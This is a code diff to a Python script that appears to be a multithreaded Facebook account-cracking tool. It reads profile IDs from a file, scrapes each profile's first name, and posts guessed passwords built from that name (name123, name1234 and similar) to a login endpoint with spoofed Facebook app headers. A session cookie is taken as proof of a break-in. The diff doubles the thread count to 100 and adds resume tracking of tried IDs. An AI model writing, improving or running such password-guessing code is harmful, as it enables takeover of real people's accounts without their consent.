@@ -1,4 +1,3 @@
-import random
 import requests
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -7,13 +6,19 @@ import threading
 print_lock = threading.Lock()
 file_lock = threading.Lock()
 
+used_usernames = set()
+try:
+    with open("/storage/emulated/0/used_ids.txt", "r") as used_file:
+        used_usernames = {line.strip() for line in used_file if line.strip()}
+except FileNotFoundError:
+    pass
+
 def try_passwords(session, login_url, username, first_name, headers, payload_base):
     passwords = [f"{first_name}1234", f"{first_name}123", f"{first_name}123456", f"{first_name}123456789"]
     for password in passwords:
         payload = {**payload_base, "email": username, "pass": password, "login": "Log In"}
-        print(payload)
         response = session.post(login_url, headers=headers, data=payload)
-        with open("response.html", "w", encoding="utf-8") as file:
+        with open(f"/storage/emulated/0/status/{username}.html", "w", encoding="utf-8") as file:
             file.write(response.text)
         if "c_user" in session.cookies.get_dict():
             return True, session.cookies.get_dict().get("c_user")
@@ -31,16 +36,17 @@ def attempt_login(username):
         "X-FB-Net-HNI": "51502",
         "X-FB-SIM-HNI": "51502",
         "X-FB-HTTP-Engine": "Liger",
-        'x-fb-connection-type': 'Unknown',
-        'accept-encoding': 'gzip, deflate',
-        'content-type': 'application/x-www-form-urlencoded',
-        'x-fb-http-engine': 'Liger',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]',
+        "x-fb-connection-type": "Unknown",
+        "accept-encoding": "gzip, deflate",
+        "content-type": "application/x-www-form-urlencoded",
+        "x-fb-http-engine": "Liger",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]",
     }
 
     response = requests.get(url, headers=headers)
     with open("username.html", "w", encoding="utf-8") as file:
         file.write(response.text)
+
     if response.ok:
         soup = BeautifulSoup(response.text, "html.parser")
         title = soup.find("title")
@@ -81,11 +87,19 @@ def attempt_login(username):
         with print_lock:
             print(f"⚠️ Error for {username}: {e}")
 
+    with file_lock:
+        with open("/storage/emulated/0/used_ids.txt", "a") as used_file:
+            used_file.write(f"{username}\n")
+
 if __name__ == "__main__":
-    max_workers = 50
-    # Read usernames from a text file
+    max_workers = 100
     with open("/storage/emulated/0/facebook_profile_id.txt", "r") as f:
-        usernames = [line.strip() for line in f if line.strip()]
+        usernames = [line.strip() for line in f if line.strip() and line.strip() not in used_usernames]
+
+    # with file_lock:
+    #     with open("used_profile_id.txt", "a") as used_file:
+    #         for username in usernames:
+    #             used_file.write(f"{username}\n")
 
     while True:
         try:
